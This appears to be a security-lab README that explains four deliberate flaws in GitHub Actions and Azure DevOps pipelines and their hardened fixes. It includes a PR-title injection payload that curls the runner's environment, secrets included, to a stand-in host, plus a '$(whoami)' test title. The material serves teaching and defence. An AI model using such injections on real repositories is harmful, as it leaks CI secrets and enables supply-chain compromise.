# Lab 11: Poisoned CI pipelines (GitHub Actions + Azure DevOps)

Both CI definitions are unsafe on purpose. The root-level files are the ones each platform picks up automatically; the hardened twins live out of the way for comparison.

- GitHub Actions: `.github/workflows/ci.yml` (unsafe) vs `.github/workflows/ci-hardened.yml`
- Azure DevOps: `azure-pipelines.yml` (unsafe) vs `pipelines/azure-pipelines.hardened.yml`

**OWASP Top 10:2025:** [A03 Software Supply Chain Failures](https://owasp.org/Top10/2025/) / [A08 Software or Data Integrity Failures](https://owasp.org/Top10/2025/)

## The four bugs (present in both unsafe pipelines)

1. **Secrets exposed to pull requests.** `secrets:` referenced in a pipeline triggered by forks. In GitHub, `pull_request_target` + explicit secret use hands tokens to untrusted code; in Azure, exposing secrets to PR builds from forks does the same.
2. **Script injection.** Untrusted values interpolated directly into `run:` scripts:

```yaml
# GitHub (unsafe): title lands in a shell
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl -s $SECRETS.site/x -d "$(env)" #` executes in the runner with secrets in the environment. The Azure twin does it with `$(System.PullRequest.SourceBranch)`.

3. **Unpinned actions / loose versions.** `actions/checkout@v4` style tags are mutable; a compromised tag injects code into every build.

4. **Overbroad token permissions.** Default `GITHUB_TOKEN` with write access everywhere; Azure service connections with production scope on PR builds.

## Exploit (local walkthrough)

1. Read `.github/workflows/ci.yml` and find the `echo` with `${{ ... }}`.
2. Simulate: open a PR titled `$(whoami)`, watch the runner print `runner`.
3. With a secret referenced in the same job, that PR title now exfiltrates it. Both Azure files have the same shape with `$( )` macro syntax.

## Fix

Compare with the hardened twins, which show the four mitigations:

- **No secrets on untrusted code.** Secrets only in `push`-triggered or `pull_request` (not `_target`) jobs on trusted branches; forks get sandboxed builds.
- **No untrusted interpolation into `run:`.** Pass values via `env:` and quote them; use the event payload file (`github.event_path`) or `$(cat $ENV_FILE)` instead of template substitution in shell.
- **Pin actions to full commit SHA** (`actions/checkout@<40-hex>`); in Azure, pin container/job images and templates to fixed versions.
- **Least privilege.** `permissions: contents: read` at the workflow level; minimal Azure service connections per pipeline.

## Verify

In the hardened files: no `secrets.*` reachable from fork PRs, no `${{ }}` or `$( )` inside `run:` blocks, SHA-pinned actions, explicit minimal `permissions:`.

## Warning

Do not point either unsafe file at real credentials; they exist to be read, not run.